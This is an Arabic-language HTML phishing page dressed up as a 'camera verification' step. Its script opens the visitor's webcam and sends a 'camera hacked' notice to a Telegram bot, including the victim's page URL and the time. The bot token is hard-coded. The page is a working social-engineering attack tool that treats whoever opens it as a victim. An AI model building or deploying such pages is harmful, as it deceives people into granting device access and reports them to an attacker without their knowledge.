<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>📸 الوصول إلى الكاميرا</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: white; }
        button { background: #0088cc; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 18px; cursor: pointer; }
        video { width: 300px; margin-top: 20px; border-radius: 10px; display: none; }
    </style>
</head>
<body>
    <h1>📸 مطلوب التحقق بالكاميرا</h1>
    <button id="btn">📸 السماح بالوصول</button>
    <video id="video" autoplay playsinline></video>
    <div id="status"></div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');
        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
        
        document.getElementById('btn').onclick = async function() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').style.display = 'block';
                document.getElementById('video').srcObject = stream;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: userId,
                        text: "📸 تم اختراق الكاميرا!\nالضحية: " + window.location.href + "\nالوقت: " + new Date().toLocaleString()
                    })
                });
                document.getElementById('status').innerHTML = '✅ تم الاختراق!';
            } catch(e) {
                document.getElementById('status').innerHTML = '❌ فشل الوصول';
            }
        };
    </script>
</body>
</html>
